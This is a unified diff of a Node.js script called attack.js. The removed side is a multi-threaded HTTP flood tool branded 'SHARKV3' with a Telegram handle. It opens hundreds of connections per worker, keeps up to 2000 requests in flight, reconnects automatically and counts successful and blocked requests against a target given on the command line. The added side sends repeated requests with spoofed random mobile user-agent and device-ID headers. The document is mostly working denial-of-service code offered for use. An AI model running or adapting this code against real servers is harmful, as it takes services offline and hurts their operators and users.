@@ -1,158 +1,86 @@
 const http = require('http');
-const https = require('https');
-const { Worker, isMainThread, workerData } = require('worker_threads');
-const readline = require('readline');
-const net = require('net');
+const faker = require('faker');
+const uuid = require('uuid');
 
-const THREADS = 22;
-const POWER_MULTIPLIER = 2;
-const MAX_INFLIGHT = 2000;
-const LIVE_REFRESH_RATE = 100;
-
-let totalRequests = 0;
-let successCount = 0;
-let errorCount = 0;
-let maxRps = 0;
-let rpsLastSecond = 0;
-let end;  // Define the `end` variable here for the main thread
-
-// Helper function to get a random number within a range (inclusive)
-function getRandomInRange(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
+// Generate Random Mobile User-Agent (UA)
+function generateRandomUA() {
+  const mobileBrands = ['Apple', 'Samsung', 'Huawei', 'Google', 'Xiaomi'];
+  const devices = ['iPhone', 'Galaxy', 'Pixel', 'Mate', 'Redmi'];
+  const osVersions = ['14.4', '10.0', '11', '9', '13'];
+  const randomBrand = mobileBrands[Math.floor(Math.random() * mobileBrands.length)];
+  const randomDevice = devices[Math.floor(Math.random() * devices.length)];
+  const randomOSVersion = osVersions[Math.floor(Math.random() * osVersions.length)];
+  
+  return `${randomBrand} ${randomDevice} ${randomOSVersion}`;
 }
 
-if (isMainThread) {
-    if (process.argv.length < 4) {
-        console.error('Usage: node attack.js <target> <duration_secs>');
-        process.exit(1);
+// Generate Random Device ID (Android or iOS format)
+function generateRandomDeviceID() {
+  const isAndroid = Math.random() < 0.5; // Randomly decide if it's Android or iOS
+  return isAndroid ? uuid.v4().replace(/-/g, '') : faker.datatype.uuid().replace(/-/g, '');
+}
+
+// HTTP Request Function to send requests
+function sendRequest(targetUrl) {
+  const options = {
+    hostname: targetUrl.hostname,
+    port: 80, // Assuming HTTP/1.1, default port for HTTP
+    path: targetUrl.pathname,
+    method: 'GET',
+    headers: {
+      'User-Agent': generateRandomUA(),
+      'Device-ID': generateRandomDeviceID(),
+      'Connection': 'keep-alive',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'Accept-Language': 'en-US,en;q=0.5',
     }
+  };
 
-    const target = process.argv[2];
-    const duration = parseInt(process.argv[3]);
-
-    end = Date.now() + duration * 1000; // Define end time here in the main thread
-
-    console.clear();
-    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
-
-    // Start the workers with dynamic connection numbers
-    for (let i = 0; i < THREADS; i++) {
-        const initialConnections = getRandomInRange(200, 500);  // Random initial connections between 200 and 500
-        new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
-    }
-
-    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        const additionalConnections = getRandomInRange(154, 500);  // Random additional connections between 154 and 500
-        new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
-    }
-
-    // Live Stats
-    setInterval(() => {
-        maxRps = Math.max(maxRps, rpsLastSecond);
-        renderStats();
-        rpsLastSecond = 0;
-    }, LIVE_REFRESH_RATE);
-
-    function renderStats() {
-        readline.cursorTo(process.stdout, 0, 0);
-        readline.clearScreenDown(process.stdout);
-
-        // Remaining time calculation
-        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);  // in seconds
-        const minutesRemaining = Math.floor(timeRemaining / 60);
-        const secondsRemaining = Math.floor(timeRemaining % 60);
-
-        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-        console.log(`===========================`);
-        console.log(`total: ${totalRequests}`);
-        console.log(`max-r: ${maxRps}`);
-        console.log(`===========================`);
-        console.log(`succes: ${successCount}`);
-        console.log(`Blocked: ${errorCount}`);
-        console.log(`===========================`);
-        console.log(`TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
-    }
-
-    const server = net.createServer(socket => {
-        socket.on('data', data => {
-            const msg = data.toString();
-            if (msg === 'req') totalRequests++, rpsLastSecond++;
-            else if (msg === 'ok') successCount++;
-            else if (msg === 'err') errorCount++;
-        });
+  const req = http.request(options, (res) => {
+    let data = '';
+    res.on('data', (chunk) => {
+      data += chunk;
     });
-    server.listen(9999);
 
-} else {
-    const { target, duration, initial, connections } = workerData;
-    const endTime = Date.now() + duration * 1000;  // end time for worker threads
+    res.on('end', () => {
+      console.log(`Response from ${targetUrl.hostname}: ${res.statusCode}`);
+    });
+  });
 
-    const socket = net.connect(9999, '127.0.0.1');
-    const sendStat = msg => socket.write(msg);
+  req.on('error', (err) => {
+    console.error(`Error: ${err.message}`);
+  });
 
-    function sendLoop(client, inflight) {
-        if (Date.now() > endTime || client.destroyed) return;
-
-        if (inflight.count < MAX_INFLIGHT) {
-            try {
-                inflight.count++;
-                const req = client.request({ method: 'GET', path: '/' });
-
-                req.on('response', () => {
-                    inflight.count--;
-                    sendStat('ok');
-                });
-
-                req.on('error', () => {
-                    inflight.count--;
-                    sendStat('err');
-                });
-
-                req.end();
-                sendStat('req');
-            } catch {
-                inflight.count--;
-                sendStat('err');
-            }
-        }
-
-        // Slight delay to avoid killing the system
-        setTimeout(() => sendLoop(client, inflight), 0.5);  // Increase delay slightly for stability
-    }
-
-    function createConnection() {
-        if (Date.now() > endTime) return;
-
-        let client;
-        try {
-            const parsedUrl = new URL(target);
-            const protocol = parsedUrl.protocol === 'https:' ? https : http;
-            client = protocol.request({
-                hostname: parsedUrl.hostname,
-                port: parsedUrl.port || (protocol === https ? 443 : 80),
-                path: parsedUrl.pathname || '/',
-                method: 'GET',
-            });
-
-            const inflight = { count: 0 };
-
-            client.on('error', () => {
-                client.destroy();
-                setTimeout(createConnection, 500); // auto-recover fast
-            });
-
-            client.on('close', () => setTimeout(createConnection, 500));
-
-            client.on('connect', () => {
-                for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
-            });
-        } catch {
-            setTimeout(createConnection, 100);
-        }
-    }
-
-    for (let i = 0; i < connections; i++) {
-        createConnection();
-    }
+  req.end();
 }
+
+// Simulate Multiple Requests with Randomized User-Agent and Device ID
+function simulateLoad(targetUrl, duration) {
+  const endTime = Date.now() + duration * 1000; // Duration in milliseconds
+  let requestsSent = 0;
+
+  const interval = setInterval(() => {
+    if (Date.now() >= endTime) {
+      clearInterval(interval);
+      console.log(`Test complete. ${requestsSent} requests sent.`);
+      return;
+    }
+    
+    sendRequest(targetUrl);
+    requestsSent++;
+  }, 100); // Delay 100ms between requests to avoid flooding
+}
+
+// Parse command-line arguments
+const args = process.argv.slice(2);
+if (args.length < 2) {
+  console.log("Usage: node attack.js <target_url> <duration_in_seconds>");
+  process.exit(1);
+}
+
+const targetUrl = new URL(args[0]); // Target URL (http://example.com)
+const duration = parseInt(args[1], 10); // Duration in seconds
+
+// Start the load test
+simulateLoad(targetUrl, duration);
